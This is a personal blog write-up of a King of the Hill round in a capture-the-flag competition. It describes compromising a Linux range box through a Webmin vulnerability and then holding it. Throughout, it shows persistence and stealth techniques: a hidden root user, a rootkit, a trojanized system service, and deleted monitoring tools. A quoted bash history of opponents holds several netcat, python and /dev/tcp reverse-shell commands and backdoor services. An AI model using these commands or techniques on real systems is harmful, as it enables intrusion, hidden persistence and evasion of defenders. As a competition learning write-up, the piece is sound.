@@ -1,0 +1,308 @@
+<!doctype html>
+<html lang="en">
+    <head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta content='text/html; charset=utf-8' http-equiv='content-type' />
+
+<link rel="alternate" type="application/rss+xml" title="RSS Feed for Ethan Ho" href="/index.xml" />
+
+<meta name="generator" content="Hugo 0.92.2" />
+
+<link href="https://fonts.googleapis.com/css?family=Montserrat:400,700|Open+Sans:400,700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Bitter&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+
+<link href="https://eth007.me/blog/css/styles.css" rel="stylesheet">
+
+<title>Ethan Ho</title>
+
+
+
+<meta name="description" content="Different box this time, your target is now 10.128.0.4&ndash;straight to root. Remember that there may be non-vulnerable services on the machine. Recon is the #1 focus.
+Once you have access to the fourth machine in the range you need to listen on port tcp/5000, you can do this with nc, for example. The flag will be sent at a specific time. Retain control of the box to get all the flags.">
+<meta name="author" content="">
+
+
+<meta property="og:type" content="website">
+<meta property="og:title" content="Hack a Bit 0x1 - King of the Hill" />
+<meta property="og:description" content="Different box this time, your target is now 10.128.0.4&ndash;straight to root. Remember that there may be non-vulnerable services on the machine. Recon is the #1 focus.
+Once you have access to the fourth machine in the range you need to listen on port tcp/5000, you can do this with nc, for example. The flag will be sent at a specific time. Retain control of the box to get all the flags." />
+<meta property="og:url" content="https://eth007.me/blog/ctf/hackabit-0x1-koth/" />
+<meta property="og:image" content="https://eth007.me/blog/static/open-graph.png">
+<meta property="og:author" content="">
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta property="twitter:domain" content="https://eth007.me/blog/">
+<meta property="twitter:url" content="https://eth007.me/blog/ctf/hackabit-0x1-koth/">
+<meta name="twitter:title" content="Hack a Bit 0x1 - King of the Hill">
+<meta name="twitter:description" content="Different box this time, your target is now 10.128.0.4&ndash;straight to root. Remember that there may be non-vulnerable services on the machine. Recon is the #1 focus.
+Once you have access to the fourth machine in the range you need to listen on port tcp/5000, you can do this with nc, for example. The flag will be sent at a specific time. Retain control of the box to get all the flags.">
+<meta name="twitter:image" content="https://eth007.me/blog/static/open-graph.png">
+
+<link rel="icon" type="image/x-icon" href="https://eth007.me/blog/static/favicon.ico">
+</head>
+    <body>
+        <div class="content">
+            <nav class="blog-navigation">
+
+  <div class="left">
+    
+      <div class="blog-logo">
+        
+        
+
+        <a href='/blog/' title="Ethan Ho">
+          <img src="https://eth007.me/blog/img/logo.png" alt="Ethan Ho">
+        </a>
+
+      </div>
+    
+      <div class="blog-info">
+          <div class="blog-title">
+            <a href='/blog/' title="Ethan Ho">
+              <h1>Ethan Ho</h1>
+            </a>
+          </div>
+    
+          <div class="blog-description">
+            <a href='/blog/' title="Ethan Ho">
+              <h2></h2>
+            </a>
+          </div>
+      </div>
+
+  </div>
+
+  <div class="right">
+
+    <div class="blog-links">
+
+      <ul class="links">
+
+        
+
+          <li class="item page"><a href='/blog/about' title="about">about</a></li><li class="item page"><a href='/blog/cypat' title="projects">projects</a></li><li class="item page"><a href='https://github.com/Eth007' title="github">github</a></li>
+
+        
+        
+        
+
+      </ul>
+
+    </div>
+
+  </div>
+
+
+</nav>
+            
+
+<div class="single">
+
+    <article>
+
+        <div class="article-meta">
+        
+    <ul class="article-info">
+        <li class="time" style="">
+            <time class="time">22 May 2023</time>
+        </li>
+        <li class="reading-time" style="">
+            <span class="material-icons">timer</span>12 min read
+        </li>
+        <li class="words-count" style="">
+            <span class="material-icons">article</span>2461 words
+        </li>
+    </ul>
+
+    <ul class="article-tags" style="">
+
+        
+            
+                <li>
+                    <a href='/blog/tags/koth'>#koth</a>
+                </li>
+            
+                <li>
+                    <a href='/blog/tags/ctf'>#ctf</a>
+                </li>
+            
+             
+
+    </ul>
+
+</div>
+                      
+        <div class="article-header">
+            <h1 class="article-title">Hack a Bit 0x1 - King of the Hill</h1>          
+            <h2 class="article-excerpt">Fending off hostile high schoolers on a &#34;semi-isolated&#34; cyber range</h2>  
+        </div>
+
+        <div class="article-content">
+            <blockquote>
+<p>Different box this time, your target is now <code>10.128.0.4</code>&ndash;straight to root. Remember that there may be non-vulnerable services on the machine. Recon is the #1 focus.</p>
+<p>Once you have access to the fourth machine in the range you need to listen on port tcp/5000, you can do this with  <code>nc</code>, for example. The flag will be sent at a specific time. Retain control of the box to get all the flags. We will spam the flag a few times around that point in time so that you are sure to receive it if you have things setup properly.</p>
+</blockquote>
+<p>This weekend I participated in Shift Cyber&rsquo;s <a href="https://www.hackabit.com/">Hack a Bit</a> final round, and earned 1st place out of 50 finals qualifiers. There were a few interesting CTF challenges, but for the most part, I focused on the &ldquo;King of the Hill&rdquo; challenge, which involved fully compromising a Linux virtual machine, and mantaining access.</p>
+<p>The exploits used to gain access were pretty standard and well documented, but the more interesting part was post-exploitation reconnaissance, persistence, and defense. In this writeup, I wanted to document my process for doing this both for myself in future KoTH situations, and to help others learn more about the process.</p>
+<h2 id="scoring-structure">Scoring Structure</h2>
+<p>In this challenge, players had to hack into a machine, and stay on it for as long as possible. At eight different times throughout the weekend, a flag was sent to the machine on port 5000/tcp. This meant that to collect flags, players needed to set up a TCP listener that was active at the time the flags were sent. The box was also periodically reverted, to allow everyone a chance to attack it even after patches.</p>
+<h2 id="initial-access">Initial Access</h2>
+<p>Running an nmap scan against the machine, I found that the machine was running several services. A list of the services I discovered is below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">- port 21: ProFTPd
+- port 22: OpenSSH
+- port 3306: MySQL
+- port 4369: Erlang Port Mapper Daemon
+- port 10000: Webmin
+</code></pre></div><p>After looking at each service and poking around, port 10000, webmin, stood out to me the most. This service is essentially a remote administration tool, so it would be the most likely to lead to RCE (as just getting credentials to log in could equate to a shell).</p>
+<p>As I had no credentials, I looked for a semi-recent vulnerability in Webmin that allowed for unauthenticated RCE. After a few google searches, I found <a href="https://github.com/ruthvikvegunta/CVE-2019-15107">CVE-2019-15107</a>, and a corresponding exploit. Running this exploit against the server from the provided jumpbox, I quickly got a callback and immediately got access to a root shell.</p>
+<h2 id="persistence---ssh-keys">Persistence - SSH keys</h2>
+<p>The first thing I did after gaining a shell was drop my SSH public key onto the machine. This would give me access to the machine through SSH, so that I did not have to rely on the reverse shell spawned by the exploit. I did this for the <code>root</code> user, and because I wanted this access to actually work through SSH, before I used the connection I had to enable SSH root login through the <code>/etc/ssh/sshd_config</code> file, as it had been prohibited earlier. Because I did not have a TTY through the reverse shell, I used the <code>sed</code> command to noninteractively edit the file to allow root login with an SSH key.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo ssh-rsa AAAAB3Nz [truncated] qwRo33uAU= root@range-connection &gt; /root/.ssh/authorized_keys
+sed -i &#39;s/PermitRootLogin no/PermitRootLogin prohibit-password/g&#39;
+systemctl restart sshd
+</code></pre></div><p>To stop people from editing my keys easily, I marked them as immutable with the <code>chattr</code> command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">chattr +i /root/.ssh/authorized_keys
+chattr +i /root/.ssh/
+</code></pre></div><p>This was essentially my main persistence for the whole competition. This SSH key stayed on the box for as long as the box lasted, as I planted it after each box reset. It was never removed by any other competitors.</p>
+<h2 id="persistence---apt-user">Persistence - <code>apt</code> user</h2>
+<p>After gaining a foothold on the root user, I made a backup user in case I got locked out. I made an user named <code>apt</code>, which was meant to mimic a system user. I first created this user, then edited its user information in the <code>/etc/passwd</code> file to make it a bit more stealthy. (looking at you, whoever made an user named <code>pwner123</code>) I changed the UID and GID to 0, so that my new user would have full root permissions, and changed the GECOS field and the home directory to make it look less suspicious. (however, the 0 UID and <code>/bin/bash</code> login shell still pretty much give it away) Finally, I moved the line to the <em>middle</em> of the <code>/etc/passwd</code> file, so that it would be harder for people to find. After deleting the original home folder in <code>/home/</code>, I now had a stealthy root user that I could also add my SSH key to and log in to even if my access to the root account was disrupted.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">apt:x:0:0:apt:/var/lib/apt:/bin/bash
+</code></pre></div><h2 id="persistence---webmin">Persistence - Webmin</h2>
+<p>As a secondary method of persistence, I wanted a way into Webmin even if the vulnerability was patched. I found the database of webmin users at <code>/etc/webmin/miniserv.users</code>, and found a password hash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">admin:$1$XXXXXXXX$ez/w79XPdb0sj/bswFgxd1:0
+</code></pre></div><p>Cracking the password with <a href="https://www.openwall.com/john/">John the Ripper</a>, I found that the password for the <code>admin</code> user was blank:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Loaded 1 password hash (md5crypt [MD5 32/64 X2])
+Will run 8 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+                 (admin)
+1g 0:00:00:00 100% 2/3 10.00g/s 28860p/s 28860c/s 28860C/s 123456..222222
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div><p>This meant that I get a shell on the machine through Webmin, just by entering <code>admin</code> and an empty password. Because of this, after the initial access, I stopped using the exploit and just started logging into webmin normally for future box resets.</p>
+<p>After gaining access to the Webmin administrator console, I changed it to a more secure password that I knew, and was able to maintain persistance through webmin for the rest of the competition.</p>
+<h2 id="patching---webmin">Patching - Webmin</h2>
+<p>At this point in the competition, I began to patch the vulnerabilities that I had gotten into the box with. Changing the Webmin password ensured that no one would get in that way, but I also had to patch the RCE vulnerability. Reading into the details of this vulnerability, I found that it was found in the <code>password_change.cgi</code> script in Webmin. I stopped this from being exploited by deleting this file (found at <code>/usr/local/webmin/password_change.cgi</code>). After this, I effectively &ldquo;locked out&rdquo; everyone who did not have existing persistence on the machine (which I don&rsquo;t think was anyone, actually, as I had put this machine as priority over the other, non-KoTH, CTF challenges).</p>
+<h2 id="persistence---other-methods">Persistence - Other methods</h2>
+<p>Now, I had pretty much full control over the machine. No one else had access, and I was the only one able to collect the first flag, which came at 7 PM PST the first day of the competition. So, I did experiment with other methods of stealthy persistence, such as compiling and installing the <a href="https://github.com/m0nad/Diamorphine">Diamorphine</a> rootkit to hide my processes and files. However, I eventually deemed this overkill, as I had pretty much locked everyone out, and no one had removed my SSH key. I also did have a crontab entry running a custom binary that spawned a reverse shell, but this ended up not helping too much for the same reasons.</p>
+<h2 id="persistence---flag-collector">Persistence - Flag collector</h2>
+<p>As Friday went on, I realized that I <em>really</em> couldn&rsquo;t rely on my SSH connection and netcat listener staying open the whole night, and the whole next two days. I was planning to be out for the whole morning on Saturday, so I needed something that could collect flags for me to submit later, without relying on an open connection. So, I came up with a plan. I would make a listener that would send my commands to a Discord webhook!</p>
+<p>At first, I made a script that took lines from stdin and sent them to the webhook with <code>curl</code>. I then opened a tmux session and piped my netcat listener to the script. This worked perfectly:</p>
+<p><img src="/blog/img/flags.png" alt="webhook"></p>
+<p>However, there was one problem. At around 4:01 AM PST, the box was reset, and my script was deleted with the box. :(</p>
+<p>Hope was not lost. The next day, I quickly regained access to the reset box with username <code>admin</code> and blank password on Webmin, and replaced much of my persistence. I repatched the vulnerabilities, killed shells, and finally had control over the box again.</p>
+<p>This time, I was more stealthy with my flag collector. I placed it in <code>/usr/lib/mysql/</code>, and named it <code>mysql-daemon-agent</code> to be run under a systemd service called <code>hackabit.service</code>. Anyone who read the code, however, would know that was <em>not</em> what it was:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#007f7f">#!/usr/bin/python3</span>
+
+<span style="color:#fff;font-weight:bold">import</span> socket
+<span style="color:#fff;font-weight:bold">import</span> requests
+
+s = socket.socket()
+port = <span style="color:#ff0;font-weight:bold">5000</span>
+s.bind((<span style="color:#0ff;font-weight:bold">&#39;&#39;</span>, port))
+<span style="color:#fff;font-weight:bold">print</span> (<span style="color:#0ff;font-weight:bold">&#34;socket binded to </span><span style="color:#0ff;font-weight:bold">%s</span><span style="color:#0ff;font-weight:bold">&#34;</span> %(port))
+s.listen(<span style="color:#ff0;font-weight:bold">5</span>)
+<span style="color:#fff;font-weight:bold">print</span> (<span style="color:#0ff;font-weight:bold">&#34;socket is listening&#34;</span>)
+<span style="color:#fff;font-weight:bold">while</span> <span style="color:#fff;font-weight:bold">True</span>:
+  c, addr = s.accept()
+  <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#39;Got connection from&#39;</span>, addr )
+  requests.post(<span style="color:#0ff;font-weight:bold">&#39;https://discord.com/api/webhooks/&lt;CENSORED&gt;&#39;</span>, headers={ <span style="color:#0ff;font-weight:bold">&#39;Content-Type&#39;</span>: <span style="color:#0ff;font-weight:bold">&#39;application/json&#39;</span>}, data=<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#39;</span><span style="color:#0ff;font-weight:bold">{{</span><span style="color:#0ff;font-weight:bold">&#34;username&#34;: &#34;flags&#34;, &#34;content&#34;: &#34;</span><span style="color:#0ff;font-weight:bold">{</span>c.recv(<span style="color:#ff0;font-weight:bold">1024</span>).strip()<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">}}</span><span style="color:#0ff;font-weight:bold">&#39;</span>, )
+  c.close()
+</code></pre></div><p>This basically listened on the socket for flags, then sent anything it received to the Discord webhook.</p>
+<p>And it worked! I received the flags for 9 AM PST and 11 AM PST (among other traffic from scans and other people poking around), while being AFK and not maintaining any connections to the box.</p>
+<p><img src="https://cdn.discordapp.com/attachments/767475492613521430/1110093206529523792/image.png" alt="flags"></p>
+<p>Finally, the box was reset one more time. This time, I quickly got in and established my persistence, but I did not patch the vulnerabilities, as it was getting lonely in there :(</p>
+<p>Because of this, my flag collector needed to be more stealthy than ever before. I decided to go a step further: injecting my flag collector code into a &ldquo;normal&rdquo; system process.</p>
+<p>I settled on this process:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root        9096       1  0 23:21 ?        00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+</code></pre></div><p>This process was run by <code>unattended-upgrades.service</code>, a service that is responsible for automatic updates via <code>apt</code>. However, this was a python script, which meant that I could just change the code.</p>
+<p>I edited <code>/usr/share/unattended-upgrades/unattended-upgrade-shutdown</code> and added my listener and discord webhook sender to the <code>main()</code> function, and restarted the service. I did not want the process being obviously listening on port 5000 to be obvious to people running commands like <code>ss</code>, so I conveniently deleted <code>/usr/bin/ss</code> and <code>/usr/bin/lsof</code>. While I was at it, I went ahead and deleted <code>/usr/bin/nc</code>, <code>/usr/bin/ncat</code>, <code>/usr/bin/netcat</code>, and <code>/usr/bin/tcpdump</code>. :wink:</p>
+<h2 id="defense">Defense</h2>
+<p>Mainly defense consisted of patching and killing persistence and shells. I covered patching in depth in a previous section, so here I will focus on shells and persistence.</p>
+<p>Persistence for the most part was easy to spot. A few out of place services and cron jobs, for instance.</p>
+<p>Some other competitors made it easy for me and left me their bash history :)</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#34;nathaniel_singer ALL=(ALL:ALL) ALL&#34; &gt;&gt; /etc/sudoers
+cat /etc/sudoers
+wall -n &#34;HELLO UML HACKERS : ))) Wanna hear a joke? Stay tunedsudo -k&#34; --no-banner
+wall --help
+wall -n &#34;HELLO UML HACKERS : ))) Wanna hear a joke? Stay tunedwall --help&#34; --nobanner
+sudo tee -a /etc/systemd/system/system.service &gt; /dev/null &lt;&lt;EOT
+[Unit]
+Description=Systemd service
+
+[Service]
+Type=oneshot
+ExecStart=/usr/bin/nc -e /bin/bash (IP removed) 4240 2&gt;/dev/null&#34;
+
+[Install]
+WantedBy=multi-user.target
+EOT
+
+sudo systemctl daemon-reload; sudo systemctl enable system; sudo systemctl start system; sudo systemctl status system
+cat /etc/systemd/system/system.service
+sudo apt install --update nc
+sudo apt install nc
+sudo apt install netcat
+PS1=&#39;${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39;; export TERM=xterm-256color
+[...]
+d) for fd in (0,1,2)];pty.spawn(&#34;/bin/sh&#34;)&#39;
+export RHOST=&#34;(IP removed)&#34;;export RPORT=4240;python3 -c &#39;import socket,os,pty;s=socket.socket();s.connect((os.getenv(&#34;RHOST&#34;),int(os.getenv(&#34;RPORT&#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;/bin/sh&#34;)&#39;
+ls
+cd nathaniel_singer/
+[...]
+nano ~/.bashrc
+nc (IP removed) 4240 -e /bin/bash &gt;/dev/null &amp;
+nc (IP removed) 4240 -e /bin/bash &gt;/dev/null &amp;
+nc (IP removed) 4240
+[...]
+echo &#39;nc (IP removed) 4240 -e /bin/bash &gt;/dev/null &amp;&#39; &gt;&gt; ~/.bashrc
+[...]
+crontab -e
+[200~* * * * * /bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/(IP removed)/4240 0&gt;&amp;1&#39;~
+</code></pre></div><p>So that was easy. I removed the cron entries, systemd services, bashrc entries, and SSH keys for the <code>nathaniel_singer</code> admin management user. I also killed any shells that I saw when monitoring <code>ps -ef</code>.</p>
+<p>Some interesting processes I saw:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">perl -MIO -e $p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c= [...]
+</code></pre></div><p>This likely indicated an exploit for the original CVE vulnerability, and the reverse shell still running. Killing it quickly killed the shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sh -c /usr/bin/perl -e &#39;use Socket;$i=&#34;10.128.0.2&#34;;$p=5885;socket(S,PF_INET,SOCK_STREAM,getprotobyname [...]
+</code></pre></div><p>Another exploit string for a reverse shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python3 -c import os;os.fork()or(os.setsid(),print(f&#34;/proc/{os.getpid()}/fd/{os.memfd_create(str())}&#34;) [...]
+</code></pre></div><p>Something really suspicious that I just decided to kill before investigating further. Afterwards, I found that it was being run by a service called <code>hab.service,</code> with the <em>totally legit</em> description reading &ldquo;This restarts services periodically to keep the box open to all users.&rdquo; That one did fool me, so I didn&rsquo;t actually delete the service, just that process. Nice one.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sh -i
+</code></pre></div><p>I kept seeing processes running under this. Likely some reverse shell. I just killed them and they never came back after patching.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">/proc/6309/fd/4
+</code></pre></div><p>That&rsquo;s got to be related to the <code>memfd_create</code> exploit from earlier. I later found out that it was running a persistent script but hey, there&rsquo;s no way that&rsquo;s not malicious&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">tcpdump -i any port 5000 -vvv
+</code></pre></div><p>Someone trying to steal my flags! I just deleted <code>tcpdump</code> and removed all the sources from <code>/etc/apt/sources.list</code> to stop them from installing it back.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">nc -l 5000
+</code></pre></div><p>Yea, I&rsquo;ll just kill that.</p>
+<h2 id="bonus---direct-access">Bonus - direct access</h2>
+<p>Somewhere along the way, I noticed that we actually had direct access to the boxes through a public IP. Once I got a shell, I sent an outbound HTTP request to a webhook that I controlled, and this revealed the public IP of the box. The range wasn&rsquo;t really &ldquo;semi-isolated&rdquo; after all! Instead of tunneling my HTTP requests to Webmin through an SSH tunnel (<code>ssh username@range.final.hackabit.com -i key -L 8080:10.128.0.4:10000</code>), I could directly access the IP from my web browser. This made a lot of things easier, as I could circumvent the jumpbox entirely and run exploits and SSH connections off of my own computer. This was especially useful becuase permissions on the jumpbox were&hellip; questionable, and we had full read access to everyone else&rsquo;s files. Wouldn&rsquo;t want my scripts and keys stolen!</p>
+<h2 id="endgame">Endgame</h2>
+<p>In the end, I had basically unlimited access through SSH. Someone was clearly also trying to defend, and went overkill, as Webmin eventually went down. I put it back up by running the miniserv.pl file with a default configuration file, and ran it again. This led it to run again, up until the box ultimately went down as someone shut it down.</p>
+<p>I was able to capture 4 out of the 5 flags that were available for capture before the box went down, with the one flag I did not capture being due to the flag sending bot being down.</p>
+<p>Flags:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Box root flag: flag{bestow_the_crown}
+Friday, 7 PM PST: flag{szavmarpjr}
+Saturday, 9 AM PST: flag{vvmjubpmoy}
+Saturday, 11 AM PST: flag{ofwbtxzjxs}
+Saturday, 3 PM PST: flag{bdlhcmlsos}
+</code></pre></div><p>Thanks to Hack a Bit for a cool King of the Hill experience!</p>
+
+        </div>
+
+    </article>
+
+</div>
+
+
+            <footer class="footer">    
+</footer>
+
+        </div>
+    </body>
+
+    
+
+</html>
